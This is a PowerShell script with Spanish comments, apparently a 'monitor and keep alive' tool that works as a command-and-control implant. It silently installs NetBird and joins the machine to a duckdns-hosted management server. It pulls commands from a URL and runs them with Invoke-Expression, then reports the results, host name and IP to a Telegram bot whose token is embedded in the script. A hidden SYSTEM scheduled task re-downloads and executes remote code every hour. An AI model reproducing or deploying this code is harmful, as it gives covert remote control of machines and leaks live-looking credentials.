# ===========================================================================
# SCRIPT DE RED CONTICS 2026 - MONITOR + KEEP ALIVE + C2 PRO (STABLE)
# ===========================================================================

# --- CONFIGURACION DE TELEGRAM ---
$TelegramToken = '8693420261:AAH0RQ-7LySZ03gglYDYOjJbY1xJonv_fak'
$TelegramChatID = '6902736310'

function Send-Telegram {
    param([string]$Message)
    try {
        $Url = "https://api.telegram.org/bot$($TelegramToken)/sendMessage"
        $Body = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = 'Markdown' }
        $Json = $Body | ConvertTo-Json -Compress
        $utf8 = [System.Text.Encoding]::UTF8.GetBytes($Json)
        Invoke-RestMethod -Uri $Url -Method Post -Body $utf8 -ContentType "application/json; charset=utf-8"
    } catch { }
}

# --- LOGICA DE RED ---
$mUrl = 'https://contics-admin.duckdns.org'
$sKey = '8552E0C2-4E0A-490D-8B93-E2CD69CDC007'
$nbPath = 'C:\Program Files\NetBird\netbird.exe'
$PCName = $env:COMPUTERNAME

# --- [PRO] RECEPTOR DE COMANDOS (C2) ---
if ($TareaUrl) {
    try {
        $resp = Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue
        if ($null -ne $resp -and $resp.Content) {
            $Order = $resp.Content.Trim()
            if ($Order -ne "NONE" -and $Order -ne "") {
                Send-Telegram -Message "⚡ *ORDEN RECIBIDA:* $PCName`n*Cmd:* `$Order"
                $Res = Invoke-Expression $Order 2>&1 | Out-String
                $ResFinal = if ($Res) { $Res } else { "Ejecutado sin salida." }
                Send-Telegram -Message "✅ *RESULTADO:*`n$ResFinal"
            }
        }
    } catch { }
}

Write-Host "`n======================================================" -ForegroundColor Cyan
Write-Host "     SISTEMA DE RED CONTICS - OPTIMIZADO PRO" -ForegroundColor Cyan
Write-Host "======================================================`n" -ForegroundColor Cyan

# 1. Instalacion
if (!(Test-Path $nbPath)) {
    Write-Host '[1/4] Instalando NetBird...' -ForegroundColor Yellow
    $installer = "$env:TEMP\nb.exe"
    Invoke-WebRequest -Uri 'https://github.com/netbirdio/netbird/releases/latest/download/netbird_installer_windows_amd64.exe' -OutFile $installer -UseBasicParsing
    Start-Process -FilePath $installer -ArgumentList '/S', '/component=service' -Wait
    Start-Sleep -Seconds 5
}

# 2. Conexion Inicial
Write-Host '[2/4] Vinculando equipo...' -ForegroundColor Yellow
& $nbPath down | Out-Null
& $nbPath up --management-url $mUrl --setup-key $sKey | Out-Null

# 3. Limpieza
if (Test-Path 'C:\Users\Public\Desktop\NetBird.lnk') { Remove-Item -Path 'C:\Users\Public\Desktop\NetBird.lnk' -Force }
Start-Sleep -Seconds 8 

# --- [PRO] SALUD DEL SISTEMA ---
try {
    $df = (Get-PSDrive C).Free / 1GB
    $rf = (Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1024
    $Salud = "`n*Disco:* {0:N2} GB libres`n*RAM:* {0:N0} MB libres" -f $df, $rf
} catch { $Salud = "" }

# 4. Reporte e IP
$status = & $nbPath status
$lineaIP = $status | Select-String 'NetBird IP:'
if ($lineaIP) {
    $nbIP = ($lineaIP.ToString() -split ':')[1].Trim()
    $nbIP = ($nbIP -split '/')[0].Trim() 
    $Msg = "*[OK] NODO CONECTADO*`n`n*Equipo:* $PCName`n*IP:* $nbIP" + $Salud
    Send-Telegram -Message $Msg
    Write-Host " [+] CONECTADO: $nbIP" -ForegroundColor Green
    $nbIP | clip
}

# 5. PERSISTENCIA (SIN CONFLICTO DE COMILLAS)
Write-Host '[4/4] Configurando Tarea de Persistencia...' -ForegroundColor Yellow
$TaskName = "Contics_KeepAlive"

# Usamos una base64 o formato simple para evitar quiebre de comillas en la URL
$InnerCmd = "iex (iwr '$GitHubRawUrl' -UseBasicParsing)"
$ActionScript = "powershell.exe -WindowStyle Hidden -Command `"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $InnerCmd`""

try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command `"$ActionScript`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null

    # Ajuste de intervalo
    $vTask = Get-ScheduledTask -TaskName $TaskName
    $vTask.Triggers[0].Repetition.Interval = "PT1H" 
    $vTask.Triggers[0].Repetition.Duration = "P365D"
    Set-ScheduledTask -InputObject $vTask | Out-Null
    Write-Host " ✅ Todo listo." -ForegroundColor Green
} catch {
    Write-Host " ⚠️ Error en persistencia: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host '------------------------------------------------------' -ForegroundColor Cyan
Write-Host "`nTerminado."
Read-Host
